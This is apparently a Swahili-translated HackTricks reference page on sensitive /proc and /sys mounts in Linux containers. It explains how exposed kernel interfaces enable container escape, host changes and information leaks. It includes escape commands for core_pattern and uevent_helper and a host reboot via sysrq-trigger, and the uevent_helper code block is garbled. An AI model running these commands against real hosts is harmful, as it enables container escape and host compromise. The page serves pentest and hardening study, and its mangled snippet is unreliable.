# Vipimo Vyenye Hisia

{% hint style="success" %}
Jifunze & zoezi AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Mafunzo ya HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Jifunze & zoezi GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Mafunzo ya HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Angalia [**mpango wa michango**](https://github.com/sponsors/carlospolop)!
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
{% endhint %}

<figure><img src="../../../..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

Kufichua `/proc` na `/sys` bila kujitenga kwa njia sahihi ya namespace inaleta hatari kubwa za usalama, ikiwa ni pamoja na kuongezeka kwa eneo la mashambulizi na kufichua habari. Direktori hizi zina faili nyeti ambazo, ikiwa hazijasakinishwa vizuri au kupatikana na mtumiaji asiyeidhinishwa, zinaweza kusababisha kutoroka kwa kontena, mabadiliko kwenye mwenyeji, au kutoa habari itakayosaidia mashambulizi zaidi. Kwa mfano, kusakinisha kimakosa `-v /proc:/host/proc` kunaweza kukiuka ulinzi wa AppArmor kutokana na asili yake ya msingi wa njia, kuacha `/host/proc` bila ulinzi.

**Unaweza kupata maelezo zaidi ya kila udhaifu wa uwezekano katika** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**.**

## Udhaifu wa procfs

### `/proc/sys`

Direktori hii inaruhusu upatikanaji wa kubadilisha vipimo vya kernel, kawaida kupitia `sysctl(2)`, na ina vijitengo kadhaa vya wasiwasi:

#### **`/proc/sys/kernel/core_pattern`**

* Inaelezwa katika [core(5)](https://man7.org/linux/man-pages/man5/core.5.html).
* Inaruhusu kufafanua programu ya kutekelezwa wakati wa kizazi cha faili ya msingi na herufi 128 za kwanza kama hoja. Hii inaweza kusababisha utekelezaji wa nambari ikiwa faili inaanza na mabomba `|`.
*   **Jaribio la Kujaribu na Utekaji**:

```bash
[ -w /proc/sys/kernel/core_pattern ] && echo Ndiyo # Jaribu upatikanaji wa kuandika
cd /proc/sys/kernel
echo "|$overlay/shell.sh" > core_pattern # Weka kikandamizi cha desturi
sleep 5 && ./crash & # Kuzindua kikandamizi
```

#### **`/proc/sys/kernel/modprobe`**

* Maelezo zaidi katika [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
* Ina njia ya mzigo wa moduli ya kernel, inayoitwa kwa ajili ya kupakia moduli za kernel.
*   **Mfano wa Kupima Upatikanaji**:

```bash
ls -l $(cat /proc/sys/kernel/modprobe) # Angalia upatikanaji wa modprobe
```

#### **`/proc/sys/vm/panic_on_oom`**

* Inahusishwa katika [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
* Bendera ya ulimwengu inayodhibiti ikiwa kernel inapaniki au inaita OOM killer wakati hali ya OOM inatokea.

#### **`/proc/sys/fs`**

* Kulingana na [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html), ina chaguo na habari kuhusu mfumo wa faili.
* Upatikanaji wa kuandika unaweza kuwezesha mashambulizi mbalimbali ya kukataa huduma dhidi ya mwenyeji.

#### **`/proc/sys/fs/binfmt_misc`**

* Inaruhusu usajili wa watafsiri kwa muundo wa binary usio wa asili kulingana na nambari zao za uchawi.
* Inaweza kusababisha ukuaji wa mamlaka au upatikanaji wa kabati wa mizizi ikiwa `/proc/sys/fs/binfmt_misc/register` inaweza kuandikwa.
* Udukuzi na maelezo yanayofaa:
* [Rootkit ya maskini kupitia binfmt\_misc](https://github.com/toffan/binfmt\_misc)
* Mafunzo ya kina: [Kiungo cha Video](https://www.youtube.com/watch?v=WBC7hhgMvQQ)

### Vinginevyo katika `/proc`

#### **`/proc/config.gz`**

* Inaweza kufunua usanidi wa kernel ikiwa `CONFIG_IKCONFIG_PROC` imezimwa.
* Inafaa kwa wadukuzi kutambua udhaifu katika kernel inayotumika.

#### **`/proc/sysrq-trigger`**

* Inaruhusu kuita amri za Sysrq, ikisababisha uanzishaji wa haraka wa mfumo au hatua nyingine muhimu.
*   **Mfano wa Kuwasha Upya Mwenyeji**:

```bash
echo b > /proc/sysrq-trigger # Inawasha upya mwenyeji
```

#### **`/proc/kmsg`**

* Inafichua ujumbe wa pete ya kernel.
* Inaweza kusaidia katika udukuzi wa kernel, kuvuja kwa anwani, na kutoa habari nyeti ya mfumo.

#### **`/proc/kallsyms`**

* Inaorodhesha ishara zilizosafirishwa za kernel na anwani zao.
* Muhimu kwa maendeleo ya udukuzi wa kernel, hasa kwa kushinda KASLR.
* Habari ya anwani inazuiliwa na `kptr_restrict` ikiwa imewekwa kama `1` au `2`.
* Maelezo katika [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

#### **`/proc/[pid]/mem`**

* Inashirikiana na kifaa cha kumbukumbu ya kernel `/dev/mem`.
* Kihistoria lilikuwa dhaifu kwa mashambulizi ya ukuaji wa mamlaka.
* Zaidi katika [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

#### **`/proc/kcore`**

* Inawakilisha kumbukumbu halisi ya mfumo kwa muundo wa msingi wa ELF.
* Kusoma kunaweza kufichua kumbukumbu ya mwenyeji na maudhui ya kumbukumbu za kontena zingine.
* Ukubwa mkubwa wa faili unaweza kusababisha matatizo ya kusoma au kuharibika kwa programu.
* Matumizi ya kina katika [Kudondosha /proc/kcore mnamo 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/).

#### **`/proc/kmem`**

* Kiolesura mbadala kwa `/dev/kmem`, ikionyesha kumbukumbu halisi ya kernel.
* Inaruhusu kusoma na kuandika, hivyo mabadiliko moja kwa moja ya kumbukumbu ya kernel.

#### **`/proc/mem`**

* Kiolesura mbadala kwa `/dev/mem`, ikionyesha kumbukumbu halisi.
* Inaruhusu kusoma na kuandika, mabadiliko ya kumbukumbu yote yanahitaji kutatua anwani za kivutio hadi kimwili.

#### **`/proc/sched_debug`**

* Inarudi taarifa za ratiba ya mchakato, ikipuuza ulinzi wa nafasi ya PID.
* Inafichua majina ya mchakato, vitambulisho vya ID, na vitambulisho vya cgroup.

#### **`/proc/[pid]/mountinfo`**

* Hutoa habari kuhusu maeneo ya kufunga katika nafasi ya kufunga ya mchakato.
* Inafichua eneo la `rootfs` au picha ya kontena.

### Udhaifu wa `/sys`

#### **`/sys/kernel/uevent_helper`**

* Hutumiwa kushughulikia vifaa vya kernel `uevents`.
* Kuandika kwa `/sys/kernel/uevent_helper` kunaweza kutekeleza hati za kigeni wakati wa kuzindua `uevent`.
*   **Mfano wa Utekaji**: %%%bash

#### Unda mzigo

echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper

#### Pata njia ya mwenyeji kutoka kwa kufunga OverlayFS kwa kontena

njia_ya_mwenyeji=$(sed -n 's/._\perdir=(\[^,]_).\*/\1/p' /etc/mtab)

#### Weka uevent\_helper kwa msaidizi wa kigeni

echo "$njia_ya_mwenyeji/evil-helper" > /sys/kernel/uevent\_helper

#### Zindua uevent

echo change > /sys/class/mem/null/uevent

#### Soma matokeo

cat /output %%%
#### **`/sys/class/thermal`**

* Inadhibiti mipangilio ya joto, ikisababisha mashambulizi ya DoS au uharibifu wa kimwili.

#### **`/sys/kernel/vmcoreinfo`**

* Inavuja anwani za kernel, ikisababisha uwezekano wa kuhatarisha KASLR.

#### **`/sys/kernel/security`**

* Ina `securityfs` interface, ikiruhusu usanidi wa Modules za Usalama za Linux kama AppArmor.
* Upatikanaji unaweza kuwezesha kontena kulegeza mfumo wake wa MAC.

#### **`/sys/firmware/efi/vars` na `/sys/firmware/efi/efivars`**

* Inafunua interfaces za kuingiliana na EFI variables katika NVRAM.
* Kutokuwa sawa au kutumia vibaya kunaweza kusababisha kompyuta zenye matatizo au mashine za mwenyeji zisizoweza kuanza.

#### **`/sys/kernel/debug`**

* `debugfs` inatoa interface ya kudebug "bila sheria" kwa kernel.
* Historia ya masuala ya usalama kutokana na asili yake isiyo na kizuizi.

### Marejeo

* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
* [Kuelewa na Kufanya Linux Containers Kuwa Imara](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc\_group\_understanding\_hardening\_linux\_containers-1-1.pdf)
* [Kutumia Vibaya Kontena za Linux Zenye Mamlaka na Zisizo na Mamlaka](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container\_whitepaper.pdf)

<figure><img src="../../../..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
Jifunze & zoezi la Udukuzi wa AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Mafunzo ya HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Jifunze & zoezi la Udukuzi wa GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Mafunzo ya HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Angalia [**mpango wa michango**](https://github.com/sponsors/carlospolop)!
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
{% endhint %}
